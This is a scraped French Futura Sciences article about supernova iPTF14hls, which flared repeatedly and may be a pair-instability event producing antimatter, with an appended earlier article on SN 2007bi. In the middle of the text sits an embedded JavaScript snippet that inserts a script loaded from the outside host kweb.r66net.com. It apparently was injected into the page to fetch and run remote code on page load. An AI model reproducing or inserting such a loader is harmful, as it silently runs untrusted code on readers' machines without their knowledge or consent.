{"title": "Antimatière : l'étoile qui ne voulait pas mourir", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "14/11/2017", "content": "La supernova iPTF14hls intrigue les astronomes : elle s'est produite au moins six fois, contre une seule pour les SN II habituelles. Son étoile semble refuser obstinément de mourir. Il pourrait s'agir en fait d'une classe exotique d'étoiles variables fabriquant de l'antimatière. Ce qu'il faut retenir Les supernovae SN II ne durent que 100 jours environ et ne se produisent qu'une fois, laissant comme cadavre stellaire une étoile à neutrons ou un trou noir. Découverte en 2014, iPTF14hls apparaissait, au début, comme une SN II particulièrement brillante. Mais, au lieu de baisser comme prévu, sa luminosité a augmenté à plusieurs reprises pendant 600 jours, comme si une étoile refusait de disparaître et explosait à nouveau en supernova. Plusieurs explications ont été proposées, mais elles sont toutes problématiques. La plus plausible fait intervenir une étoile très massive et si chaude qu'elle produirait en son cœur de l'antimatière de façon périodique. L'existence des supernovae est connue de l'humanité depuis au moins mille ans. Ainsi, SN 1054 a été observée par les astronomes chinois durant la dynastie Song, plus précisément de juillet 1054 à avril 1056 ; nous observons aujourd'hui les restes de cette  supernova  sous la forme de la nébuleuse du Crabe. Par ailleurs, il se produit statistiquement trois à quatre supernovae par siècle dans la  Voie lactée . Certes, ces étoiles nouvelles sont souvent cachées par l'absorption des poussières du milieu interstellaire, mais elles ont probablement intrigué les Hommes depuis, au moins, la haute Antiquité. Ce n'est pourtant qu'au cours des années 1930 que nous avons commencé à les étudier sérieusement et à comprendre de quoi il s'agissait, avec les travaux de Walter Baade et Fritz Zwicky. Il existe plusieurs types de supernovae. Comme ceux-ci sont régulièrement évoqués en astronomie et en astrophysique, il serait tentant de croire que la zoologie de ces astres est maintenant bien déterminée. Pourtant, il semblerait que ce ne soit pas le cas. En effet, en septembre 2014, des astronomes travaillant dans le cadre du programme  Palomar Transient Factory  ont fait la découverte de iPTF14hls, comme expliqué dans un article publié dans  Nature  et disponible sur  arXiv . La supernova iPTF14hls dure plus longtemps qu'une supernova SN II classique, est plus brillante et, surtout, s'est produite cinq fois depuis que nous l'observons. © S. Wilkinson, LCO                               iPTF14hls, la supernova qui a explosé au moins 6 fois La supernova iPTF14hls est énigmatique pour plusieurs raisons. La première est évidente au vu de sa courbe de lumière, c'est-à-dire l'évolution de sa  luminosité  au cours du temps. Le début de cette courbe est celui caractéristique des supernovae SN II, celles qui proviennent de l'effondrement gravitationnel d'une  étoile  au moins 8 à 10 fois plus massive que le Soleil. Mais, au lieu de décliner tranquillement après un pic de lumière, la courbe remonte, comme si l'étoile génitrice n'avait pas été soufflée par l'explosion et qu'elle en produisait une seconde. Au cours des trois dernières années, c'est comme si cinq supernovae s'étaient produites au même endroit, avec une même étoile refusant obstinément de mourir.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La perplexité des astrophysiciens n'a certainement fait qu'augmenter quand ceux-ci ont fouillé dans les archives astronomiques des décennies passées à la recherche de plus d'informations sur l'étoile à l'origine de ce curieux phénomène. En effet, cette dernière avait déjà donné lieu à une supernova en 1954. Cette photo d'archive montre qu'une supernova s'était déjà produite il y a soixante ans environ, à l'endroit même où iPTF14hls a été observée sur la voûte céleste. © S. Wilkinson, POSS, DSS, LCO                               Une production d'antimatière au cœur de l'étoile Aucune explication totalement satisfaisante n'a encore été trouvée par les chercheurs. Ces derniers sont sur plusieurs pistes, en attendant de nouvelles données devant venir du  télescope  Hubble et du  télescope Swift , qui observe dans le domaine des rayons X et gamma. Il se pourrait en effet qu'iPTF14hls soit un nouvel avatar d'un concept proposé il y a quelques dizaines d'années : celui de  Pair Instability Supernovae  (PISNe), c'est-à-dire une supernova par production de paires. Futura avait consacré l'article ci-dessous à ce nouveau type de supernovae, dont la première observation solide pouvait être SN 2007bi, et qui résulte de la production de paires de particules de  matière  et d' antimatière  par les  photons  gamma dans le cœur d'une étoile d'autant plus chaude qu'elle est massive. Si tel est bien le cas, iPTF14hls serait donc, en quelque sorte, un « hoquet » de plus dans l'évolution d'une étoile au moins 50 fois plus massive que le Soleil (et même très probablement au moins 100 fois plus massive), ce qui est surprenant car ce genre d'étoiles est censé plutôt avoir existé au tout début de  l’histoire de l’univers observable . Or, iPTF14hls s'est produite relativement récemment puisqu'il est possible de la voir aujourd'hui dans une  galaxie naine  irrégulière, à seulement 500 millions d'années-lumière environ de la Voie lactée. En accord avec les explications du fonctionnement d'une PISNe données dans l'article ci-dessous, l'étoile verrait donc ses réactions thermonucléaires s'emballer périodiquement. Des explosions provoqueraient la dilatation de cet  astre  et, donc, son refroidissement, mais sans jusqu'ici conduire à sa destruction complète. Il s'agirait ainsi de l'équivalent d'une étoile variable comme une céphéide ou une nova, en l'occurrence, une  supernova par production de paires pulsionnelle . Nous pouvons tout de même penser que ces explosions ne dureront pas éternellement, car, à chaque fois, l'étoile doit perdre une importante quantité de masse. Mais peut-être faudra-t-il chercher une explication encore plus exotique à iPTF14hls... Pour en savoir plus De l'antimatière dans certaines supernovae ?  Article de Laurent Sacco publié le 10/12/2009 Certaines supernovae pourraient provenir de la création de paires de particules et d' antiparticules ... Un groupe d'astrophysiciens pense avoir observé le premier exemple indiscutable de ce type d'explosion d'étoile avec de l'antimatière : SN 2007bi. Il y a presque 40 ans, plusieurs astrophysiciens théoriciens ont prédit que certaines étoiles étaient instables à cause d'un phénomène bien décrit par les  équations  de l' électrodynamique quantique . En effet, avec une paire de photons gamma suffisamment énergétiques, un calcul mené à l'aide des fameux  diagrammes de Feynman , bien connus des spécialistes de la  physique  des hautes  énergies , indique que des paires de particule-antiparticule peuvent être créées. Dans le cas d'une étoile très massive dépassant les 100  masses  solaires, les photons gamma fabriqués par les réactions thermonucléaires dans le cœur de ces étoiles peuvent donner naissance à une paire électron-positron. Il s'agit au fond d'une conséquence assez simple de la formule d' Einstein , E=mc 2 , l'énergie des photons étant convertie en la masse des deux particules. Lorsque la création de matière et d'antimatière selon ce processus devient importante, la pression du flux de photons gamma sur les couches de l'étoile devient insuffisante pour s'opposer à sa contraction sous l'effet de sa propre  gravité . Or, cette même contraction va augmenter le taux des  réactions nucléaires  en chauffant le cœur de l'étoile. La production de photons gamma créateurs d'antimatière va encore être accrue et le processus devient instable. Il s'emballe. La température ne va cesser de grimper et en très peu de temps le cœur de l'étoile va exploser en convertissant sa matière en noyaux lourds. Il se produit alors une supernova baptisée  Pair Instability Supernovae  (PISNe) ne laissant aucun astre compact derrière elle (sauf éventuellement un  trou noir  si l'étoile est suffisamment massive). L'explosion doit surpasser celle d'une supernova normale et s'accompagner de la production d'une grande quantité de  nickel  radioactif en plus d'une grande quantité de matière éjectée. Sur cette photo, la supernova SN 2007bi est située à l'intersection des barres blanches. © Dave Young                               Des clés pour comprendre l'univers jeune ? D'après plusieurs chercheurs, dont  Peter Nugent  et  Avishay Gal-Yam , une supernova détectée en 2007 dans le cadre d'un programme de recherche international baptisé  Nearby Supernova Factory  ( SNfactory ) constitue la première observation concluante d'une PISNe. Les arguments à l'appui de cette conclusion sont exposés en détail dans un article récent de  Nature  et ils semblent plus  solides  que ceux issus d'une précédente observation, celle de  SN 2006gy . Les données fournies par le télescope  Keck  et le  Very Large Telescope  ( VLT ) ont montré qu'il s'agissait bien de l'explosion d'une étoile d'au moins 200 masses solaires avec une absence des raies de l' hydrogène  et de l' hélium . Cette absence avait initialement été interprétée dans le cadre des modèles de supernovae de type SN Ic mais l'exceptionnelle luminosité de SN 2007bi ne devait pas tarder à aiguiller les chercheurs dans une autre direction. Rollin Thomas, un membre de la collaboration s'occupant de  SNfactory , a utilisé le  superordinateur  Franklin du  National Energy Research Scientific Computing Center  ( NERSC ) pour simuler différents types de supernovae dont des PISNe. Le meilleur  spectre  calculé s'accordant avec les observations est clairement celui d'une supernova où ont lieu des créations de paires de particule-antiparticule et l'instabilité qui en résulte. Le cœur de l'étoile génitrice de SN 2007bi devait être en train de produire des quantités massives d' oxygène  et être très chaud lorsque la création de paires a dominé l'évolution de l'étoile. L'explosion s'est accompagnée d'une création importante de nickel radioactif et, en se désintégrant, cet élément a rendu la matière éjectée particulièrement lumineuse pendant 555 jours. Il est intéressant de noter que cette supernova est apparue dans une galaxie naine, le genre de galaxie qui a dû naître en premier dans l' univers  riche en étoiles de type III, justement très massives et initialement dépourvues de  métaux , c'est-à-dire dans le langage des astrophysiciens, sans noyaux au-delà du  lithium . D'autres supernovae du genre PSINe devraient être découvertes dans un avenir proche et elles pourraient donner des renseignements sur ce qui s'est passé pendant les  âges sombres , au moment où l'univers fabriquait ses premières étoiles. ", "theme": "sciences"}